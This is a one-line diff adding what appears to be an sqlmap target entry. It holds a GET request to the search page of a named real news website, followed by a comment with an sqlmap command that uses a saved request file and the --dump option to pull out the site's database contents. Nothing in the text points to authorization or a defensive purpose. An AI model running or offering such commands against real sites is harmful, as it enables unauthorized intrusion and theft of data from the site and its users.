@@ -1,0 +1,1 @@
+http://www.kalerkantho.com:80/search?cx=partner-pub-0600503450204720%3A2337922458&cof=FORID%3A10&ie=UTF-8&q=sdfsfsffsf (GET)  # .\sqlmap.py -r .\postReqs\kalerkontho --dump
